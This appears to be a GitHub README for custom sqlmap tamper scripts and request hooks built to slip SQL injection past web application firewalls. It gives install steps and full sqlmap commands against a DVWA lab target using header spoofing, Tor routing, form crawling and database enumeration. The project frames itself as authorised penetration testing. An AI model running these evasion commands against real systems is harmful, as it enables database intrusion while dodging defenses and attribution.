<p align="center">
  <img src="images/glitch.gif" alt="Glitch effect" width="100%">
</p>

# 🛡️ SQLMap Tampers – Bearded Viking Security Forge

> **Advanced sqlmap tamper scripts for modern WAF bypass – JSON Unicode escapes, mathematical obfuscation, nested versioned comments, and random keyword splitting. Continuously updated. For authorised security testing only.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![GitHub last commit](https://img.shields.io/github/last-commit/BeardedVikingTX/SQLMap_Tampers)](https://github.com/BeardedVikingTX/SQLMap_Tampers/commits/main)

---

## 📦 What’s Inside

| Tamper Script | Description |
|---------------|-------------|
| **`json_unicode_escape.py`** | Fully fledged JSON obfuscator: Unicode/hex/octal escapes, random case, whitespace tricks, JSON/array wrapping, junk injection, and comment fragmentation – all configurable. |
| **`math_exp_obfuscator.py`** | Replaces every integer literal with a random, DBMS‑aware mathematical expression (trig, log, bitwise, etc.) drawn from 100+ templates. |
| **`nested_versioned_comments.py`** | Wraps SQL keywords in deeply nested MySQL versioned comments (`/*!50727...*/`) with random hex/base64 padding – up to 5 levels deep, with multiple DBMS fallbacks. |
| **`random_chunk_splitter.py`** | Splits SQL keywords into 2–4 fragments, inserting inline or versioned comments between them – randomness per request to defeat signature‑based WAFs. |

> **More tampers are in active development** – watch this space!

---

## 🚀 Installation (One‑Click)

We’ve made it dead simple to install all tampers into your sqlmap environment.

1. Clone the repo:
```
   git clone https://github.com/BeardedVikingTX/SQLMap_Tampers.git
   cd SQLMap_Tampers
```
2. Run the installer:
```
chmod +x install_tampers.sh
./install_tampers.sh
```
_Optionally, backup existing tampers:_
```
./install_tampers.sh --backup
```
_To copy all `.py` files in the directory:_
```
./install_tampers.sh --all
```
3. Verify they’re installed:
```
sqlmap --list-tampers | grep -E "(json_unicode_escape|math_exp_obfuscator|nested_versioned_comments|random_chunk_splitter)"
```
**Success!** Here’s what it looks like when the script does its magic:

* **Tamper Scripts BEFORE Installing Our Scripts:**
<p align="center"> 
  <img src="images/sqlmap_tampers_before_bash_script.png" alt="SQLMap Tamper Scripts BEFORE Installing Custom Scripts." width="80%"> 
</p>

* **Installing OUR Tamper Scripts:** 
<p align="center">
  <img src="images/installed_tampers.png" alt="Installing Custom Tamper Scripts." width="80%">
</p>

* **Tamper Scripts AFTER Installing Our Scripts:**
<p align="center">
  <img src="images/sqlmap_tampers_after_bash_script.png" alt="SQLMap Tamper Scripts AFTER Installing Custom Scripts." width="80%">
</p>

## 🎯 Usage Examples
Once installed, use them individually or in combination:
```
# Single tamper
sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" --tamper=json_unicode_escape

# Stack multiple tampers (order matters)
sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
       --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter

# With other built‑in tampers
sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
       --tamper=json_unicode_escape,space2comment,randomcase
```

## 🧠 Why These Tampers?
* **SON APIs** – the `json_unicode_escape` tamper deals with the quirks of JSON parsers and WAFs that don’t handle Unicode escapes correctly.
* **WAF evasion** – our tampers combine multiple layers (math obfuscation, comment nesting, keyword fragmentation) to bypass even advanced WAFs.
* **DBMS awareness** – scripts detect the backend and adapt (MySQL, PostgreSQL, MSSQL, Oracle) so they never break your SQL.
* **Randomisation** – each request is unique; signature‑based detection becomes ineffective.

## 🔧 Customisation
For the JSON tamper (`json_unicode_escape.py`), edit the `SETTINGS` dict at the top to enable/disable individual techniques:
```
SETTINGS = {
    'unicode_escape': True,
    'hex_escape': False,
    'random_case': True,
    'json_wrap': True,
    # ... etc.
}
```

## 🔧 Pre/Post‑Processing Hooks
Beyond tamper scripts, sqlmap offers pre‑processing and post‑processing hooks that let you modify every request before it’s sent and inspect/alter every response before sqlmap processes it.

This is invaluable for:
* **Session management** – _automatically extract and inject CSRF tokens, JWTs, or nonces._
* **Custom encoding** – _encode payloads in Base64, hex, or your own scheme._
* **Header rotation** – _spoof `X‑Forwarded‑For`, rotate User‑Agents, add timestamps._
* **Response decoding** – _decompress gzip, unwrap Base64, extract JSON values._
* **Multi‑step authentication** – _handle login flows programmatically._

## 🧠 Our Enhanced Architecture
We've moved beyond simple single‑file hooks into a modular, production‑grade system:
```
Processes/
├── hooks.py          # The orchestrator – imports and exposes preprocess/postprocess to sqlmap
├── preprocess.py     # Request‑side engine – handles headers, tokens, encoding, wrapping
├── postprocess.py    # Response‑side engine – decodes, extracts tokens, handles auth
└── headers.txt       # (Optional) User‑provided custom headers – one per line: Header: value
```
**OPTIONAL:** There is a `headers_example.txt` file that you can use as a reference point.

***Key improvements:***
* **Modular separation** – each component focuses on a single responsibility.
* **Smart header protection** – critical headers (`Host`, `Content-Length`, `Connection`) are never encoded or injected into, avoiding server errors.
* **Custom headers via `headers.txt`** – users can paste session cookies, JWTs, or security tokens after manual login; if the file is empty or missing, the system falls back to defaults.
* **Verbose logging** – every operation is logged to `sqlmap_preprocess.log` and `sqlmap_postprocess.log`, plus real‑time output to stderr for transparency.
* **Full error handling** – any failure is caught and logged; sqlmap never crashes due to a hook issue.

## 🚀 How to Use the New System
1. Place the `Processes/` folder in your working directory (or anywhere you like).
2. (Optional) Add custom headers – edit `Processes/headers.txt`:
```
# Example headers – one per line
Cookie: PHPSESSID=abc123; security=low
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
X-Custom-Header: MyValue
```
3. Run sqlmap pointing to `hooks.py`:
```
sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
       --preprocess=./Processes/hooks.py \
       --postprocess=./Processes/hooks.py \
       --batch --level=5
```
## 🔧 Customisation & Configuration
Both `preprocess.py` and `postprocess.py` include a SETTINGS dict at the top – tweak these to fit your target:

* `preprocess.py` settings:
```
SETTINGS = {
    "headers": {
        "add": {
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
        },
        "randomize_user_agent": True,
        "add_timestamp": True,
        "custom_headers_file": "headers.txt",          # path to user‑provided headers
        "protected_headers": ["host", "content-length", "connection", ...],  # never touched
    },
    "payload_encoding": {
        "enabled": True,
        "method": "base64",          # base64 | hex | double_url | custom
        "wrap_json": False,
        "wrap_xml": False,
    },
    "token_injection": {
        "enabled": True,
        "inject_into": {
            "csrf": {"target": "data", "param": "csrf_token"},
            "jwt":   {"target": "headers", "param": "Authorization", "prefix": "Bearer "},
        }
    },
}
```
* `postprocess.py` settings:
```
SETTINGS = {
    "response": {
        "decode_gzip": True,
        "decode_base64": False,
        "extract_json": False,
        "json_key": "data",
        "strip_html_comments": False,
    },
    "token_extract": {
        "enabled": True,
        "patterns": [
            (r'body', r'name=["\']csrf_token["\']\s+value=["\']([^"\']+)["\']', 'csrf'),
            (r'body', r'"access_token":"([^"]+)"', 'jwt'),
            ...
        ],
    },
    "auth_flow": {
        "enabled": False,
        "success_indicator": "Dashboard",
    },
}
```
### 💡 Pro Tips
* **Combine hooks with tampers** for maximum evasion:
```
sqlmap -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#" \
       --preprocess=./Processes/hooks.py --postprocess=./Processes/hooks.py \
       --tamper=json_unicode_escape,math_exp_obfuscator
```
* **Debugging** – _check the log files (`sqlmap_preprocess.log`, `sqlmap_postprocess.log`) for detailed operation traces._
* **Custom encoding** – _override the `custom_encode()` function in `preprocess.py` with your own transformation._

# 🚀 Running the Ultimate SQLMap Operation
The following command demonstrates the full potential of our tamper suite combined with advanced sqlmap features – including Tor anonymisation, pre/post‑processing hooks, and layered WAF evasion.
```
$ python3 SQLMap_Tampers.py
*COPY THE DESIRED TAMPER SCRIPTS YOU NEED*
$ sqlmap --risk=3 --level=5 --random-agent --tor --tor-type=SOCKS5 --time-sec=10 --threads=3 --batch --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter ---preprocess=/home/beardedviking/Desktop/PythonTools/SQLMap_Tampers/Processes/hooks.py --postprocess=/home/beardedviking/Desktop/PythonTools/SQLMap_Tampers/Processes/hooks.py --flush-session --dbms=MySQL --crawl=5 --forms --technique=BEUSTQ --banner --dbs --url "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#"
```

### ⚙️ Command Breakdown

| Flag / Option | Purpose |
|---------------|---------|
| `--risk=3 --level=5` | **Maximum aggression** – uses high‑risk payloads and deep recursion. |
| `--random-agent` | **User‑Agent rotation** – evades basic fingerprinting. |
| `--tor --tor-type=SOCKS5` | **Anonymisation** – routes all traffic through the Tor network. |
| `--time-sec=10 --threads=3` | **Blind detection** – adds time‑based delays for blind SQLi; keeps threads low for stability. |
| `--batch` | **Non‑interactive mode** – auto‑accepts all prompts for unattended scanning. |
| `--tamper=...` | **Custom evasion** – our proprietary tampers bypass modern WAFs. |
| `--preprocess/--postprocess` | **Request/Response hacking** – our `hooks.py` orchestrates dynamic token handling, encoding, and decoding. |
| `--flush-session` | **Clean session** – forces a fresh scan without cached results. |
| `--dbms=MySQL` | **Optimisation** – targets MySQL, reducing noise and false positives. |
| `--crawl=5 --forms` | **Deep discovery** – crawls up to 5 levels deep and tests all HTML forms. |
| `--technique=BEUSTQ` | **All‑in‑one injection** – tests all supported techniques (Boolean, Error, Union, Stacked, Time‑based, Inline). |
| `--banner --dbs` | **Enumeration** – retrieves database banner and lists all databases. |

---

### 🛡️ Why This Is the Ultimate Setup

| Component | Benefit |
|-----------|---------|
| **Custom Tampers** | Our 4 proprietary tamper scripts (`json_unicode_escape`, `math_exp_obfuscator`, `nested_versioned_comments`, `random_chunk_splitter`) deliver **multi‑layered, randomized obfuscation** that defeats even advanced WAFs. |
| **Pre/Post‑Processing** | The `hooks.py` orchestrator dynamically injects tokens, encodes payloads, and decodes responses – handling **session management, custom encoding, and response extraction** automatically. |
| **Tor Integration** | **Full anonymity** – all traffic is routed through Tor, preventing IP‑based blocks. |
| **Maximum Coverage** | Crawling, forms, and all injection techniques ensure **no vector is missed**. |

---

### 🔧 Quick Start – One‑Command Copy‑Paste

> **Note:** Replace the target URL and adjust paths to your environment.

```bash
# Step 1: Navigate to your SQLMap_Tampers directory
cd ~/SQLMap_Tampers

# Step 2: Run the ultimate scan
sqlmap --risk=3 --level=5 \
       --random-agent \
       --tor --tor-type=SOCKS5 --time-sec=10 --threads=3 \
       --batch \
       --tamper=json_unicode_escape,math_exp_obfuscator,nested_versioned_comments,random_chunk_splitter \
       --preprocess=./Processes/hooks.py --postprocess=./Processes/hooks.py \
       --flush-session \
       --dbms=MySQL \
       --crawl=5 --forms \
       --technique=BEUSTQ \
       --banner --dbs \
       -u "https://dvwa.beardedviking.org/vulnerabilities/sqli/?id=admin&Submit=Submit#"
```


# ⚠️ Disclaimer
***Use these tools only on systems you own or have explicit written permission to test.***
_The author (Bearded Viking / Bearded Viking Security Forge) assumes **no liability** for any misuse or damage caused by these scripts. They are provided "AS IS" without warranty of any kind._

# 📜 License
This project is licensed under the MIT License – see the [LICENSE.md[(LICENSE.md) file for details.

# 👨‍💻 About the Author

<p align="center>
  <img src="images/hackers_in_the_zone.gif" alt="Hackers in the Zone" width="45%">
</p>

**Bearded Viking** (BeardedVikingTX) – Security researcher, penetration tester, and open‑source contributor.  
* 🌐 [Web](https://beardedviking.org)  
* 🎥 [TikTok](https://www.tiktok.com/@beardedvikingtx)  
* 👨‍💻 [LinkedIn](https://www.linkedin.com/in/bearded-viking-3112a8431/)  
* 📘 [Facebook](https://www.facebook.com/BeardedVikingTX)  
* ✒️ [Medium](https://beardedviking.medium.com/)  

# 🧩 Stay Tuned
We’re constantly adding new tampers and enhancing existing ones.
Star ⭐ the repo to stay updated, and feel free to open issues or PRs with your own ideas!
<p align="center"> 
  <img src="images/matrix_female_animated.gif" alt="Matrix hacker" width="45%"> 
</p>

**Happy (`ethical`) hacking! 🛡️**
